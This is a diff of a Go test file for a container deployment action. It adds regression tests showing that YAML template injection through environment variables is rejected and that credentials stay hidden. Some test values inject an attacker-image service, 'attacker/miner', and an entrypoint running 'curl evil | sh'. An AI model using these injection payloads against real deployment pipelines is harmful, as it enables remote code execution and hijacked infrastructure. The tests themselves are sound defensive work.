@@ -4,17 +4,20 @@ import (
 	"context"
 	"errors"
 	"io"
+	"maps"
 	"net/http"
 	"net/url"
 	"os"
 	"path/filepath"
+	"slices"
 	"strings"
 	"testing"
-	"text/template"
+	"unicode/utf8"
 
 	"github.com/mittwald/api-client-go/mittwaldv2/generated/clients/containerclientv2"
 	"github.com/mittwald/api-client-go/mittwaldv2/generated/schemas/containerv2"
 	"github.com/stretchr/testify/suite"
+	"gopkg.in/yaml.v3"
 )
 
 type StackActionTestSuite struct {
@@ -28,11 +31,7 @@ func (s *StackActionTestSuite) SetupTest() {
 func (s *StackActionTestSuite) TestRenderConfigTemplate_EnvReplacement() {
 	os.Setenv("FOO", "bar")
 
-	tplStr := `value: {{ .Env.FOO }}`
-	tpl, err := template.New("test").Parse(tplStr)
-	s.Require().NoError(err)
-
-	out, err := renderConfigTemplate(tpl)
+	out, err := renderConfigTemplate(`value: {{ .Env.FOO }}`)
 	s.Require().NoError(err)
 
 	s.Equal("value: bar", out.String())
@@ -671,6 +670,222 @@ func (s *StackActionTestSuite) TestStripYamlComments_PreservesLineCount() {
 		strings.Count(input, "\n"),
 		strings.Count(string(stripYamlComments([]byte(input))), "\n"),
 	)
+}
+
+// Regression tests for https://github.com/mittwald/deploy-container-action/issues/153: a substituted
+// value must not be able to change the structure of the stack definition.
+
+// yamlInjection would add a service running an attacker image if it escaped its scalar.
+const yamlInjection = "nginx\n  evil:\n    image: attacker/miner"
+
+// assertRejectsLineBreak sets a single environment variable and expects the given template to be
+// rejected because that variable's value would break out of its position in the YAML document.
+func (s *StackActionTestSuite) assertRejectsLineBreak(envName, envValue, stackYaml string) {
+	s.T().Helper()
+
+	os.Setenv(envName, envValue)
+	os.Setenv("INPUT_STACK_YAML", stackYaml)
+
+	result, err := loadYamlOptional("STACK")
+	s.Require().Error(err)
+	s.Nil(result)
+	s.Contains(err.Error(), `"`+envName+`"`)
+	s.Contains(err.Error(), "line break")
+	s.Contains(err.Error(), "quote")
+	s.NotContains(err.Error(), "attacker", "the error must not echo the value")
+}
+
+func (s *StackActionTestSuite) TestLoadYamlOptional_RejectsLineBreakInEnvValue() {
+	imageYaml := "services:\n  app:\n    image: {{ .Env.INJECTED }}\n"
+
+	testCases := map[string]struct {
+		envValue  string
+		stackYaml string
+	}{
+		"value position": {yamlInjection, imageYaml},
+		"quoted value position": {
+			"v1\"\n    entrypoint: [\"/bin/sh\", \"-c\", \"curl evil | sh\"]\n    x: \"y",
+			"services:\n  app:\n    image: nginx\n    envs:\n      VERSION: \"{{ .Env.INJECTED }}\"\n",
+		},
+		"block scalar": {
+			"echo hi\n  evil:\n    image: attacker/miner",
+			"services:\n  app:\n    image: nginx\n    command:\n      - |\n        {{ .Env.INJECTED }}\n",
+		},
+		"multi line value in quoted position": {
+			"line one\nline two",
+			"services:\n  app:\n    image: nginx\n    envs:\n      KEY: \"{{ .Env.INJECTED }}\"\n",
+		},
+		"carriage return line feed": {"nginx\r\n  evil:\r\n    image: attacker/miner", imageYaml},
+		"lone carriage return":      {"nginx\r  evil:\r    image: attacker/miner", imageYaml},
+		"trailing carriage return":  {"nginx\r", imageYaml},
+		"next line":                 {"nginx\u0085  evil:\u0085    image: attacker/miner", imageYaml},
+		"line separator":            {"nginx\u2028  evil:\u2028    image: attacker/miner", imageYaml},
+		"paragraph separator":       {"nginx\u2029  evil:\u2029    image: attacker/miner", imageYaml},
+		"index access": {
+			yamlInjection,
+			"services:\n  app:\n    image: {{ index .Env \"INJECTED\" }}\n",
+		},
+		"printf": {
+			yamlInjection,
+			"services:\n  app:\n    image: {{ printf \"%s\" .Env.INJECTED }}\n",
+		},
+		"html escaping": {
+			yamlInjection,
+			"services:\n  app:\n    image: {{ html .Env.INJECTED }}\n",
+		},
+		"range over env": {
+			yamlInjection,
+			"services:\n  app:\n    image: nginx\n    envs:\n{{ range $k, $v := .Env }}      {{ $k }}: {{ $v }}\n{{ end }}",
+		},
+		"quoted then raw": {
+			yamlInjection,
+			"services:\n  app:\n    image: nginx\n    envs:\n      A: {{ quote .Env.INJECTED }}\n      B: {{ .Env.INJECTED }}\n",
+		},
+	}
+
+	for name, testCase := range testCases {
+		s.Run(
+			name, func() {
+				os.Clearenv()
+				s.assertRejectsLineBreak("INJECTED", testCase.envValue, testCase.stackYaml)
+			},
+		)
+	}
+}
+
+func (s *StackActionTestSuite) TestLoadYamlOptional_AllowsUnreferencedMultiLineEnvValue() {
+	os.Setenv("GITHUB_EVENT", "{\n  \"action\": \"opened\"\n}")
+	os.Setenv("IMAGE", "nginx:1.27")
+	os.Setenv("INPUT_STACK_YAML", "services:\n  app:\n    image: {{ .Env.IMAGE }}\n")
+
+	result, err := loadYamlOptional("STACK")
+	s.Require().NoError(err)
+	s.Equal("nginx:1.27", s.serviceField(result, "app", "image"))
+}
+
+func (s *StackActionTestSuite) TestLoadYamlOptional_AllowsMultiLineEnvValueOutsideOutput() {
+	os.Setenv("MODE", "off")
+	os.Setenv("MULTI_LINE", "line one\nline two")
+	os.Setenv(
+		"INPUT_STACK_YAML",
+		"# old: {{ .Env.MULTI_LINE }}\nservices:\n  app:\n"+
+			"    image: {{ if eq .Env.MODE \"on\" }}{{ .Env.MULTI_LINE }}{{ else }}nginx{{ end }}\n",
+	)
+
+	result, err := loadYamlOptional("STACK")
+	s.Require().NoError(err)
+	s.Equal("nginx", s.serviceField(result, "app", "image"))
+}
+
+func (s *StackActionTestSuite) TestLoadStackData_QuoteKeepsValuesIntact() {
+	values := map[string]string{
+		"plain":               "nginx:1.27",
+		"empty":               "",
+		"comment marker":      "Tr0ub4dor #&3-long-secret",
+		"mapping indicator":   "key: value",
+		"double quotes":       `say "hi"`,
+		"single quote":        "it's",
+		"backslashes":         `C:\path\n\t`,
+		"line feed":           yamlInjection,
+		"carriage returns":    "a\r\nb\rc",
+		"unicode line breaks": "a\u0085b\u2028c\u2029d",
+		"tab":                 "a\tb",
+		"control characters":  "a\x01b\x1bc\x7fd\u0090e",
+		"byte order mark":     "a\ufeffb",
+		"noncharacter":        "a\uffffb",
+		"template syntax":     "{{ .Env.HOME }}",
+		"surrounding spaces":  "  padded  ",
+		"flow collection":     "[a, b] {c: d}",
+		"alias and tag":       "*alias &anchor !!binary",
+		"looks like null":     "null",
+		"looks like number":   "0123",
+		"non ascii":           "grüße 🚀",
+	}
+
+	for name, value := range values {
+		s.Run(
+			name, func() {
+				os.Clearenv()
+				os.Setenv("VALUE", value)
+				os.Setenv(
+					"INPUT_STACK_YAML",
+					"services:\n  app:\n    image: nginx\n    envs:\n"+
+						"      QUOTED: {{ quote .Env.VALUE }}\n      PIPED: {{ .Env.VALUE | quote }}\n",
+				)
+
+				stack, err := loadStackData()
+				s.Require().NoError(err)
+				s.Equal([]string{"app"}, slices.Collect(maps.Keys(stack.Services)))
+				s.Equal(map[string]string{"QUOTED": value, "PIPED": value}, stack.Services["app"].Envs)
+			},
+		)
+	}
+}
+
+func (s *StackActionTestSuite) TestLoadStackData_QuoteContainsInjectionAttempt() {
+	os.Setenv("COMMIT_MSG", "fix typo\n    entrypoint: [\"/bin/sh\", \"-c\", \"curl evil | sh\"]\n"+yamlInjection)
+	os.Setenv(
+		"INPUT_STACK_YAML",
+		"services:\n  app:\n    image: nginx\n    envs:\n      COMMIT_MSG: {{ quote .Env.COMMIT_MSG }}\n",
+	)
+
+	stack, err := loadStackData()
+	s.Require().NoError(err)
+	s.Len(stack.Services, 1)
+	s.Nil(stack.Services["app"].Entrypoint)
+	s.Equal(os.Getenv("COMMIT_MSG"), stack.Services["app"].Envs["COMMIT_MSG"])
+}
+
+func (s *StackActionTestSuite) TestRenderConfigTemplate_HidesRunnerCredentials() {
+	for name := range hiddenTemplateEnv {
+		s.Run(
+			name, func() {
+				os.Clearenv()
+				os.Setenv(name, "dummy-credential")
+
+				_, err := renderConfigTemplate("value: {{ .Env." + name + " }}")
+				s.Require().Error(err)
+				s.Contains(err.Error(), `map has no entry for key "`+name+`"`)
+			},
+		)
+	}
+}
+
+func (s *StackActionTestSuite) TestRenderConfigTemplate_HidesApiTokenFromIndirectAccess() {
+	os.Setenv("INPUT_API_TOKEN", "dummy-token")
+	os.Setenv("VISIBLE", "yes")
+
+	out, err := renderConfigTemplate(`{{ range $k, $v := .Env }}{{ $k }}={{ $v }};{{ end }}`)
+	s.Require().NoError(err)
+	s.Equal("VISIBLE=yes;", out.String())
+
+	out, err = renderConfigTemplate(`T: {{ index .Env (printf "%s_%s" "INPUT_API" "TOKEN") }}`)
+	s.Require().NoError(err) // index yields the zero value for a missing key
+	s.NotContains(out.String(), "dummy-token")
+}
+
+func FuzzYamlQuote(f *testing.F) {
+	for _, seed := range []string{
+		"", "plain", "a #b", "a: b", `"`, `\`, `\"`, "'", "\n", "\r\n", "\u0085", "\u2028", "\u2029",
+		"\t", "\x00", "\x7f", "\u0090", "\ufeff", "\ufffe", "{{ .Env.X }}", " lead", "trail ", "🚀",
+	} {
+		f.Add(seed)
+	}
+
+	f.Fuzz(func(t *testing.T, value string) {
+		if !utf8.ValidString(value) {
+			t.Skip("invalid UTF-8 is replaced by U+FFFD")
+		}
+
+		var parsed map[string]interface{}
+		if err := yaml.Unmarshal([]byte("key: "+yamlQuote(value)+" # comment\nnext: 1\n"), &parsed); err != nil {
+			t.Fatalf("quoted %q does not parse: %v", value, err)
+		}
+
+		if len(parsed) != 2 || parsed["key"] != value || parsed["next"] != 1 {
+			t.Fatalf("quoted %q parsed as %#v", value, parsed)
+		}
+	})
 }
 
 // updateStackResult is one scripted answer of the fake stack updater.
